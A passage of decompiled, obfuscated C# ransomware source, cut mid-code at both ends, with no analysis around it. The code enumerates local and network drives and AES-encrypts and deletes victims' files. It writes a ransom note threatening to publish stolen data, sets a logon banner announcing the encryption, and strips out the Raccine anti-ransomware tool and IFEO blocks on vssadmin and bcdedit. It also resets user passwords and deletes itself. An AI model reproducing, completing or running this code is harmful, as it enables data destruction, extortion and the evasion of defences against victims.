                                                                    p0_1.Clear();
                                                                  }
                                                                  else if (System.IO.File.Exists(fileInfo.FullName))
                                                                  {
                                                                    if (GhAMvbuoccW.HirTGWkSHczrmbY == "NO")
                                                                    {
                                                                      p0_1.Add(fileInfo.FullName);
                                                                      GhAMvbuoccW.m00000a(p0_1, p1, p2, p3, p4);
                                                                      p0_1.Clear();
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
          catch (Exception ex)
          {
          }
        }
        foreach (string str in directories)
          stringStack.Push(str);
      }
      return p0_1;
    }

    public static void m000001()
    {
      foreach (ManagementObject managementObject in new ManagementObjectSearcher("select * from Win32_NetworkConnection").Get())
      {
        if (!GhAMvbuoccW.ZmKssmQIdPi.Contains(managementObject.Path.ToString().Split('=')[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\").Replace("\"", "").Split('(')[0].Trim()))
          GhAMvbuoccW.ZmKssmQIdPi.Add(managementObject.Path.ToString().Split('=')[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\").Replace("\"", "").Split('(')[0].Trim().Replace("IPC$", ""));
      }
    }

    public static string m000002(string p0 = "", string NmrYzUWTFAwHib = "")
    {
      string str = "";
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = p0,
          Arguments = NmrYzUWTFAwHib,
          UseShellExecute = false,
          RedirectStandardOutput = true,
          StandardOutputEncoding = Encoding.GetEncoding(850)
        };
        process.Start();
        str = process.StandardOutput.ReadToEnd();
        process.WaitForExit(2500);
        process.Kill();
      }
      catch (Exception ex)
      {
      }
      return str;
    }

    public static void ubalMIbEpbeY(string p0) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = p0,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    }.Start();

    public static string TfBMtOaYnyXfeqqRN(string p0)
    {
      char[] charArray = p0.ToCharArray();
      Array.Reverse((Array) charArray);
      return new string(charArray);
    }

    public static string m000003(string p0) => Encoding.UTF8.GetString(Convert.FromBase64String(p0));

    public static void NHzvTatQZhTwKonTK(string p0 = "", string KIIbYrKbucelZ = "SW5mb3JtYXRpb24uLi4=", string OFNVwgWVfswlvJj = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
    {
      p0 = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=";
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GhAMvbuoccW.m000003(p0), true);
        if (registryKey != null)
        {
          registryKey.SetValue("LegalNoticeCaption", (object) GhAMvbuoccW.m000003(KIIbYrKbucelZ));
          registryKey.SetValue("LegalNoticeText", (object) GhAMvbuoccW.m000003(OFNVwgWVfswlvJj));
          registryKey.Close();
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        p0 = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt";
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GhAMvbuoccW.m000003(p0), true);
        if (registryKey == null)
          return;
        registryKey.SetValue("legalnoticecaption", (object) GhAMvbuoccW.m000003(KIIbYrKbucelZ));
        registryKey.SetValue("legalnoticetext", (object) GhAMvbuoccW.m000003(OFNVwgWVfswlvJj));
        registryKey.Close();
      }
      catch (Exception ex)
      {
      }
    }

    public static void xLkmmTTSHp()
    {
      try
      {
        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
          return;
        if (GhAMvbuoccW.f000018 == "YES" && !string.IsNullOrEmpty(GhAMvbuoccW.f000019) && !string.IsNullOrEmpty(GhAMvbuoccW.EiyrcFiAoaX))
          GhAMvbuoccW.NHzvTatQZhTwKonTK(KIIbYrKbucelZ: GhAMvbuoccW.f000019, OFNVwgWVfswlvJj: GhAMvbuoccW.EiyrcFiAoaX);
        else
          GhAMvbuoccW.NHzvTatQZhTwKonTK();
      }
      catch (Exception ex)
      {
      }
    }

    public static void m000004(string iKyctWUHNaEkVj = "SW5mb3JtYXRpb24uLi4=", string UwFkiThTFY = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=") => new NotifyIcon()
    {
      Icon = SystemIcons.Warning,
      Visible = true,
      BalloonTipIcon = ToolTipIcon.Warning,
      BalloonTipTitle = GhAMvbuoccW.m000003(iKyctWUHNaEkVj),
      BalloonTipText = GhAMvbuoccW.m000003(UwFkiThTFY)
    }.ShowBalloonTip(30000);

    public static void pkNBJGqTbajgL(string p0) => GhAMvbuoccW.m000002("net.exe", "user " + WindowsIdentity.GetCurrent().Name.Split('\\')[1].ToString() + " " + p0);

    public static void wDQhPDGrMto(string p0) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell.exe",
        Arguments = ("& " + p0),
        RedirectStandardError = true,
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true
      }
    }.Start();

    private static bool sMlBAtMqAgeMq(string p0, string p1)
    {
      bool flag;
      try
      {
        FileSystemAccessRule rule1 = new FileSystemAccessRule(p0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
        DirectoryInfo directoryInfo = new DirectoryInfo(p1);
        DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
        bool modified;
        accessControl.ModifyAccessRule(AccessControlModification.Set, (AccessRule) rule1, out modified);
        if (!modified)
        {
          flag = false;
        }
        else
        {
          FileSystemAccessRule rule2 = new FileSystemAccessRule(p0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
          accessControl.ModifyAccessRule(AccessControlModification.Add, (AccessRule) rule2, out modified);
          if (!modified)
          {
            flag = false;
          }
          else
          {
            directoryInfo.SetAccessControl(accessControl);
            flag = true;
          }
        }
      }
      catch (Exception ex)
      {
        flag = false;
      }
      return flag;
    }

    public static bool CRggSgCOOkjunf(string p0)
    {
      try
      {
        GhAMvbuoccW.NxIyepnTFBO nxIyepnTfbo = new GhAMvbuoccW.NxIyepnTFBO();
        DriveInfo[] drives = DriveInfo.GetDrives();
        nxIyepnTfbo.nvRebewysN = Path.GetPathRoot(p0);
        Func<DriveInfo, bool> predicate = new Func<DriveInfo, bool>(nxIyepnTfbo.m000013);
        DriveInfo driveInfo = ((IEnumerable<DriveInfo>) drives).FirstOrDefault<DriveInfo>(predicate);
        return driveInfo != null && driveInfo.DriveFormat == "NTFS";
      }
      catch
      {
        return false;
      }
    }

    public static void m000005()
    {
      try
      {
        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
          return;
        string p0_1 = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cSW1hZ2UgRmlsZSBFeGVjdXRpb24gT3B0aW9ucw==";
        try
        {
          RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey(GhAMvbuoccW.m000003(p0_1), true);
          if (registryKey1 != null)
          {
            registryKey1.DeleteSubKey("vssadmin.exe");
            registryKey1.DeleteSubKey("wmic.exe");
            registryKey1.DeleteSubKey("wbadmin.exe");
            registryKey1.DeleteSubKey("bcdedit.exe");
            registryKey1.DeleteSubKey("powershell.exe");
            registryKey1.DeleteSubKey("diskshadow.exe");
            registryKey1.DeleteSubKey("net.exe");
            registryKey1.Close();
          }
          string p0_2 = "U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXEV2ZW50TG9nXEFwcGxpY2F0aW9u";
          RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(GhAMvbuoccW.m000003(p0_2), true);
          if (registryKey2 != null)
          {
            registryKey2.DeleteSubKey("Raccine");
            registryKey2.Close();
          }
          string p0_3 = "U09GVFdBUkU=";
          RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(GhAMvbuoccW.m000003(p0_3), true);
          if (registryKey3 != null)
          {
            registryKey3.DeleteSubKey("Raccine");
            registryKey3.Close();
          }
          string p0_4 = "U09GVFdBUkU=";
          RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey(GhAMvbuoccW.m000003(p0_4), true);
          if (registryKey4 != null)
          {
            registryKey4.DeleteSubKey("Raccine");
            registryKey4.Close();
          }
        }
        catch (Exception ex)
        {
        }
        GhAMvbuoccW.m000002("taskkill", "/F /IM RaccineSettings.exe");
        GhAMvbuoccW.m000002("reg", "delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Raccine Tray\" /F");
        GhAMvbuoccW.m000002("reg", "delete HKCU\\Software\\Raccine /F");
        GhAMvbuoccW.m000002("schtasks", "/DELETE /TN \"Raccine Rules Updater\" /F");
      }
      catch (Exception ex)
      {
      }
    }

    public static void m000006(string p0, byte[] p1)
    {
      try
      {
        byte[] bytes = Encoding.ASCII.GetBytes("GotAllDone");
        using (FileStream fileStream = new FileStream(p0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
        {
          fileStream.Write(p1, 0, p1.Length);
          fileStream.Write(bytes, 0, bytes.Length);
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void XoFivSFAPFl()
    {
      string p0 = "U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcRmlsZVN5c3RlbQ==";
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GhAMvbuoccW.m000003(p0), true);
        if (registryKey == null)
          return;
        registryKey.SetValue("LongPathsEnabled", (object) 1, RegistryValueKind.DWord);
        registryKey.Close();
      }
      catch (Exception ex)
      {
      }
    }

    [DllImport("mpr.dll")]
    private static extern int WNetGetUniversalNameA(string p0, int p1, IntPtr p2, ref int p3);

    private static string m000007(string jyXjQtARhTMzoJ, int p1 = 2000)
    {
      IntPtr num;
      try
      {
        num = Marshal.AllocHGlobal(p1);
      }
      catch (OutOfMemoryException ex)
      {
        return (string) null;
      }
      string str;
      try
      {
        str = GhAMvbuoccW.WNetGetUniversalNameA(jyXjQtARhTMzoJ, 1, num, ref p1) == 0 ? Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(num)) : (string) null;
      }
      catch (Exception ex)
      {
        str = (string) null;
      }
      finally
      {
        Marshal.FreeHGlobal(num);
      }
      return str;
    }

    public static void OQGiATnqshpg()
    {
      GhAMvbuoccW.m000002("cmd.exe", "/C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 “%s” & Del /f /q “%s”");
      string str = "/C choice /C Y /N /D Y /T 3 & Del ";
      Process.Start(new ProcessStartInfo()
      {
        Arguments = "\"" + str + "\"" + Assembly.GetEntryAssembly().Location,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe"
      });
      Environment.Exit(0);
    }

    public static void m000008(string p0)
    {
      try
      {
        FileAttributes attributes1 = System.IO.File.GetAttributes(p0);
        if ((attributes1 & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
          System.IO.File.SetAttributes(p0, attributes1 & ~FileAttributes.ReadOnly);
        FileAttributes attributes2 = System.IO.File.GetAttributes(p0);
        if ((attributes2 & FileAttributes.Hidden) != FileAttributes.Hidden)
          return;
        System.IO.File.SetAttributes(p0, attributes2 & ~FileAttributes.Hidden);
      }
      catch (Exception ex1)
      {
        if (!GhAMvbuoccW.CCDyMIHlAe)
          return;
        try
        {
          System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + p0 + " - Error while removing readonly attribute: " + ex1.Message + "\r\n");
        }
        catch (Exception ex2)
        {
        }
      }
    }

    public static string m000009()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      Version version = osVersion.Version;
      string str = "";
      if (osVersion.Platform != PlatformID.Win32Windows)
      {
        if (osVersion.Platform == PlatformID.Win32NT)
        {
          switch (version.Major)
          {
            case 3:
              str = "NT 3.51";
              break;
            case 4:
              str = "NT 4.0";
              break;
            case 5:
              str = version.Minor != 0 ? "XP" : "2000";
              break;
            case 6:
              str = version.Minor != 0 ? (version.Minor != 1 ? (version.Minor != 2 ? "8.1" : "8") : "7") : "Vista";
              break;
            case 10:
              str = "10";
              break;
          }
        }
      }
      else
      {
        switch (version.Minor)
        {
          case 0:
            str = "95";
            break;
          case 10:
            str = version.Revision.ToString() == "2222A" ? "98SE" : "98";
            break;
          case 90:
            str = "Me";
            break;
        }
      }
      if (str != "")
      {
        str = "Windows " + str;
        if (osVersion.ServicePack != "")
          str = str + " " + osVersion.ServicePack;
      }
      return str;
    }

    public static string iqbhckCLJPzmcb(string p0)
    {
      string path = Path.GetTempPath() + "\\RESTORE_THEM.txt";
      try
      {
        if (!System.IO.File.Exists(path))
        {
          using (StreamWriter streamWriter = new StreamWriter(path))
          {
            streamWriter.WriteLine("All your files have been encrypted !!\r\n\r\nDon't panic please, we are here to help you.\r\n\r\nIf you don't want to cooperate and hear your mind instead of our instructions,\r\n\r\nyou will loose stupidly your files but even worse, we have been able to steal confidentials files from your machines so prepare you to see them published or sold online.\r\n\r\nAll your network may have been infected. If this is the case, note that you'll be able to decrypt all the machines successfully.\r\n\r\nFortunately, we think you are aware that we don't want this case to happens and you too.\r\n\r\nIf you really want to restore your files, we can give you what you need to do if you contact us at :\r\n\r\nRansHelp@tutanota.com\r\n\r\nIf you don't contact us within the next 48 hours, we will destroy the decryption key needed to restore your files and publish what he have stealed in forums or sell it to tiers. You'll suffer a huge financial and reputation loss in this case.\r\n\r\nIf you don't receive any answers in the next 24 hours after contacting us, please send an e-mail to :\r\n\r\nRansHelp21@tutanota.com");
            streamWriter.WriteLine("\r\n");
            streamWriter.WriteLine("KEYID: ");
            streamWriter.WriteLine(p0);
            if (GhAMvbuoccW.YazilaoopZ)
            {
              streamWriter.WriteLine("\r\n");
              streamWriter.WriteLine("PC Hardware ID: ");
              streamWriter.WriteLine("");
            }
          }
        }
        else if (!System.IO.File.ReadAllText(path).Contains(p0) && !GhAMvbuoccW.PAOJgADrbjEa)
          System.IO.File.AppendAllText(path, "\r\nAdditional KeyId:\r\n" + p0);
        return path;
      }
      catch (Exception ex1)
      {
        if (GhAMvbuoccW.CCDyMIHlAe)
        {
          try
          {
            System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "Error while writing Temp Folder Report: " + ex1.Message + "\r\n");
          }
          catch (Exception ex2)
          {
          }
        }
      }
      return path;
    }

    private static void LeefKZPaDd(string[] p0, string[] p1, string[] p2, string p3, string p4)
    {
      GhAMvbuoccW.MCSuzJljyGwrZ mcSuzJljyGwrZ = new GhAMvbuoccW.MCSuzJljyGwrZ();
      mcSuzJljyGwrZ.f000039 = p1;
      mcSuzJljyGwrZ.CToRljeBfHM = p2;
      mcSuzJljyGwrZ.hSfGYaylYziGu = p3;
      mcSuzJljyGwrZ.f00003a = p4;
      if (GhAMvbuoccW.RaNDyCdUClri && !"Windows 8".Contains("XP") && !"Windows 8".Contains("Windows 7"))
        c00002c.AQxYtYywpEIpR();
      GhAMvbuoccW.bGfpmpYMCsNkyjcK = Convert.FromBase64String(mcSuzJljyGwrZ.hSfGYaylYziGu);
      DriveInfo[] driveInfoArray = (DriveInfo[]) null;
      if (p0[0] == "[auto]")
      {
        try
        {
          driveInfoArray = DriveInfo.GetDrives();
        }
        catch (Exception ex)
        {
        }
        if (driveInfoArray.Length != 0)
        {
          for (int index = 0; index < driveInfoArray.Length; ++index)
          {
            if (driveInfoArray[index].IsReady && driveInfoArray[index].DriveType != DriveType.CDRom)
            {
              if (driveInfoArray[index].DriveType == DriveType.Network)
              {
                try
                {
                  string str = GhAMvbuoccW.m000007(driveInfoArray[index].Name);
                  if (!string.IsNullOrEmpty(str) && !GhAMvbuoccW.ZmKssmQIdPi.Contains(str))
                    GhAMvbuoccW.ZmKssmQIdPi.Add(str);
                  else if (!GhAMvbuoccW.ZmKssmQIdPi.Contains(driveInfoArray[index].Name))
                    GhAMvbuoccW.ZmKssmQIdPi.Add(driveInfoArray[index].Name);
                }
                catch (Exception ex)
                {
                  if (!GhAMvbuoccW.ZmKssmQIdPi.Contains(driveInfoArray[index].Name))
                    GhAMvbuoccW.ZmKssmQIdPi.Add(driveInfoArray[index].Name);
                }
              }
              else if (!GhAMvbuoccW.ZmKssmQIdPi.Contains(driveInfoArray[index].Name))
                GhAMvbuoccW.ZmKssmQIdPi.Add(driveInfoArray[index].Name);
            }
          }
        }
      }
      else
      {
        for (int index = 0; index < p0.Length; ++index)
        {
          if (!GhAMvbuoccW.ZmKssmQIdPi.Contains(p0[index]))
            GhAMvbuoccW.ZmKssmQIdPi.Add(p0[index]);
        }
      }
      if (GhAMvbuoccW.ZmKssmQIdPi.Contains(GhAMvbuoccW.m000003("Qzpc")) && GhAMvbuoccW.f00001e == "YES")
        GhAMvbuoccW.ZmKssmQIdPi.Remove(GhAMvbuoccW.m000003("Qzpc"));
      Parallel.ForEach<string>((IEnumerable<string>) GhAMvbuoccW.ZmKssmQIdPi, new Action<string>(mcSuzJljyGwrZ.m000014));
    }

    public static void uBTjgvutOlsTJ(string p0, string[] p1, string p2, string[] p3, string p4)
    {
      List<string> stringList1 = new List<string>();
      List<string> stringList2 = new List<string>()
      {
        ""
      };
      if (GhAMvbuoccW.f000016 == "NO")
      {
        if (GhAMvbuoccW.f000023 == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && GhAMvbuoccW.CRggSgCOOkjunf(p0))
        {
          c000020 source;
          try
          {
            source = new c000020(p0.Replace("\\", ""));
          }
          catch
          {
            stringList1 = GhAMvbuoccW.DrqYGjBvTosyB(p0, p1, p2, p3, p4);
            return;
          }
          try
          {
            GhAMvbuoccW.m00000a(((IEnumerable<string>) source.ToArray<string>()).ToList<string>(), p1, p2, p3, p4);
          }
          catch (Exception ex)
          {
            stringList1 = GhAMvbuoccW.DrqYGjBvTosyB(p0, p1, p2, p3, p4);
          }
        }
        else
          stringList1 = GhAMvbuoccW.DrqYGjBvTosyB(p0, p1, p2, p3, p4);
      }
      else
      {
        List<string> stringList3 = GhAMvbuoccW.c000003.SearchFiles(p0);
        foreach (string str1 in p1)
        {
          using (List<string>.Enumerator enumerator = stringList3.GetEnumerator())
          {
label_45:
            while (enumerator.MoveNext())
            {
              string current = enumerator.Current;
              if (p3.Length != 0)
              {
                foreach (string str2 in p3)
                {
                  if (current.EndsWith(str2))
                    goto label_45;
                }
              }
              if ((!(GhAMvbuoccW.f00001b == "NO") || current.EndsWith(str1)) && !GhAMvbuoccW.f000006.Contains(current))
              {
                if (GhAMvbuoccW.BBqvZtJMKtZyzF == "YES")
                {
                  try
                  {
                    if (uruahRFIszrntX.bURwEzWcMZKaoi(current))
                      uruahRFIszrntX.BBxxokkeNIlNHfR(current);
                  }
                  catch (Exception ex)
                  {
                  }
                }
                GhAMvbuoccW.f000006.Add(current);
                if (!GhAMvbuoccW.HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(current)))
                  GhAMvbuoccW.HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(current));
                try
                {
                  FileStream fileStream = new FileStream(current, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                  if (GhAMvbuoccW.f00000f == "YES" && fileStream.Length > (long) (Convert.ToInt32(GhAMvbuoccW.f000010) * 1024 * 1024) && !stringList2.Contains(str1))
                  {
                    if (GhAMvbuoccW.f000012 == "YES")
                    {
                      foreach (string str3 in GhAMvbuoccW.f000013)
                      {
                        if (current.ToLower().EndsWith(str3) && GhAMvbuoccW.f000014 == "YES")
                        {
                          if ((long) (Convert.ToInt32(GhAMvbuoccW.f000015) * 1024 * 1024) > fileStream.Length)
                          {
                            try
                            {
                              c000013.ybntlhJHhisLb(p3: current);
                            }
                            catch (Exception ex)
                            {
                            }
                          }
                        }
                        else if (current.ToLower().EndsWith(str3))
                        {
                          if (GhAMvbuoccW.f000014 == "NO")
                          {
                            try
                            {
                              c000013.ybntlhJHhisLb(p3: current);
                            }
                            catch (Exception ex)
                            {
                            }
                          }
                        }
                      }
                    }
                    fileStream.Dispose();
                    byte[] p1_1 = c000018.SvtZMRYDytMixf(c000018.KQanXSigbuDh(current, Convert.ToInt32(GhAMvbuoccW.f000010) * 1024 * 1024), Convert.FromBase64String(p4), new byte[8]
                    {
                      (byte) 1,
                      (byte) 2,
                      (byte) 3,
                      (byte) 4,
                      (byte) 5,
                      (byte) 6,
                      (byte) 7,
                      (byte) 8
                    });
                    c000018.EHTmbBVFpgxa(current, p1_1);
                    if (p2 != ".*")
                      System.IO.File.Move(current, current + p2);
                  }
                  else if (p2 != ".*")
                    GhAMvbuoccW.WyOQIuKbfF(current, current + p2, GhAMvbuoccW.bGfpmpYMCsNkyjcK);
                  else
                    GhAMvbuoccW.WyOQIuKbfF(current, current + ".part", GhAMvbuoccW.bGfpmpYMCsNkyjcK);
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
        }
      }
    }

    public static void m00000a(List<string> p0, string[] p1, string p2, string[] p3, string p4)
    {
      Action<string> body1 = (Action<string>) null;
      Action<string> action = (Action<string>) null;
      GhAMvbuoccW.mDsrdwsfBAgqx mDsrdwsfBagqx = new GhAMvbuoccW.mDsrdwsfBAgqx();
      mDsrdwsfBagqx.vJUzSMoRbycwzG = p0;
      mDsrdwsfBagqx.f00003e = p2;
      mDsrdwsfBagqx.nBTsxqqCcIrA = p3;
      mDsrdwsfBagqx.f000002 = p4;
      mDsrdwsfBagqx.MWjzSWdUTiapH = new List<string>()
      {
        ""
      };
      if (GhAMvbuoccW.f00001b == "NO")
      {
        if (body1 == null)
          body1 = new Action<string>(mDsrdwsfBagqx.m000017);
        Parallel.ForEach<string>((IEnumerable<string>) p1, body1);
      }
      else
      {
        List<string> vJuzSmoRbycwzG = mDsrdwsfBagqx.vJUzSMoRbycwzG;
        if (action == null)
          action = new Action<string>(mDsrdwsfBagqx.m000018);
        Action<string> body2 = action;
        Parallel.ForEach<string>((IEnumerable<string>) vJuzSmoRbycwzG, body2);
      }
    }

    private static void WyOQIuKbfF(string p0, string p1, byte[] p2)
    {
      try
      {
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        FileStream fileStream1 = new FileStream(p1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(p2, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Padding = PaddingMode.Zeros;
        rijndaelManaged.Mode = CipherMode.CBC;
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        FileStream fileStream2 = new FileStream(p0, FileMode.Open);
        int num1;
        while ((num1 = fileStream2.ReadByte()) != -1)
          cryptoStream.WriteByte((byte) num1);
        fileStream2.Dispose();
        cryptoStream.Dispose();
        fileStream1.Dispose();
        try
        {
          if (p1.Length > 0)
          {
            FileStream fileStream3 = new FileStream(p0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            if (GhAMvbuoccW.f000012 == "YES")
            {
              foreach (string str in GhAMvbuoccW.f000013)
              {
                if (p0.ToLower().EndsWith(str) && GhAMvbuoccW.f000014 == "YES")
                {
                  if ((long) (Convert.ToInt32(GhAMvbuoccW.f000015) * 1024 * 1024) > fileStream3.Length)
                  {
                    try
                    {
                      c000013.ybntlhJHhisLb(p3: p0);
                    }
                    catch (Exception ex)
                    {
                    }
                  }
                }
                else if (p0.ToLower().EndsWith(str))
                {
                  if (GhAMvbuoccW.f000014 == "NO")
                  {
                    try
                    {
                      c000013.ybntlhJHhisLb(p3: p0);
                    }
                    catch (Exception ex)
                    {
                    }
                  }
                }
              }
            }
            fileStream3.Dispose();
            int num2 = 1000000;
            while (true)
            {
              try
              {
                while (System.IO.File.Exists(p0))
                {
                  if (num2 >= 0)
                    System.IO.File.Delete(p0);
                  else
                    break;
                }
                break;
              }
              catch
              {
                --num2;
              }
            }
            if (!p1.EndsWith(".part"))
              return;
            System.IO.File.Move(p1, p1.Replace(".part", ""));
          }
          else
          {
            try
            {
              System.IO.File.Delete(p1);
            }
            catch (Exception ex)
            {
            }
          }
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void m00000b(string p0, string p1, byte[] p2, byte[] p3 = null)
    {
      try
      {
        if (GhAMvbuoccW.f000012 == "YES")
        {
          FileStream fileStream = new FileStream(p0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
          foreach (string str in GhAMvbuoccW.f000013)
          {
            if (p0.ToLower().EndsWith(str) && GhAMvbuoccW.f000014 == "YES")
            {
              if ((long) (Convert.ToInt32(GhAMvbuoccW.f000015) * 1024 * 1024) > fileStream.Length)
              {
                try
                {
                  c000013.ybntlhJHhisLb(p3: p0);
                }
                catch (Exception ex)
                {
                }
              }
            }
            else if (p0.ToLower().EndsWith(str))
            {
              if (GhAMvbuoccW.f000014 == "NO")
              {
                try
                {
                  c000013.ybntlhJHhisLb(p3: p0);
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
          fileStream.Dispose();
        }
      }
      catch (Exception ex)
      {
      }
      if (p0 != p1)
      {
        System.IO.File.Move(p0, p1);
        p0 = p1;
      }
      byte[] bytes = sAdFSOOagDt.m00002a(System.IO.File.ReadAllBytes(p0), p2, p3);
      System.IO.File.WriteAllBytes(p0, bytes);
      ++GhAMvbuoccW.f00002b;
    }

    private static void fsRkhosBCvdFpjZ(string p0, string p1, byte[] p2)
    {
      ThreadStart start1 = (ThreadStart) null;
      ThreadStart start2 = (ThreadStart) null;
      GhAMvbuoccW.cTttKVwFNmpq cTttKvwFnmpq = new GhAMvbuoccW.cTttKVwFNmpq();
      cTttKvwFnmpq.f000044 = p0;
      cTttKvwFnmpq.eedfnXcwSQkQNFbIx = p1;
      try
      {
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        FileStream fileStream1 = new FileStream(cTttKvwFnmpq.eedfnXcwSQkQNFbIx, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(p2, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Padding = PaddingMode.Zeros;
        rijndaelManaged.Mode = CipherMode.CBC;
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        try
        {
          if (GhAMvbuoccW.QtTrkEhpkGUJgMO == "YES")
          {
            MemoryMappedFile fromFile = MemoryMappedFile.CreateFromFile(cTttKvwFnmpq.f000044, FileMode.Open);
            MemoryMappedViewStream viewStream = fromFile.CreateViewStream();
            fromFile.Dispose();
            int num;
            while ((num = viewStream.ReadByte()) != -1)
              cryptoStream.WriteByte((byte) num);
            viewStream.Dispose();
          }
          else
          {
            FileStream fileStream2 = new FileStream(cTttKvwFnmpq.f000044, FileMode.Open);
            int num;
            while ((num = fileStream2.ReadByte()) != -1)
              cryptoStream.WriteByte((byte) num);
            fileStream2.Dispose();
          }
        }
        catch (Exception ex)
        {
          FileStream fileStream3 = new FileStream(cTttKvwFnmpq.f000044, FileMode.Open);
          int num;
          while ((num = fileStream3.ReadByte()) != -1)
            cryptoStream.WriteByte((byte) num);
          fileStream3.Dispose();
        }
        cryptoStream.Dispose();
        fileStream1.Dispose();
        try
        {
          if (cTttKvwFnmpq.eedfnXcwSQkQNFbIx.Length > 0)
          {
            if (GhAMvbuoccW.f000012 == "YES")
            {
              FileStream fileStream4 = new FileStream(cTttKvwFnmpq.f000044, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
              foreach (string str in GhAMvbuoccW.f000013)
              {
                if (cTttKvwFnmpq.f000044.ToLower().EndsWith(str) && GhAMvbuoccW.f000014 == "YES")
                {
                  if ((long) (Convert.ToInt32(GhAMvbuoccW.f000015) * 1024 * 1024) > fileStream4.Length)
                  {
                    try
                    {
                      c000013.ybntlhJHhisLb(p3: cTttKvwFnmpq.f000044);
                    }
                    catch (Exception ex)
                    {
                    }
                  }
                }
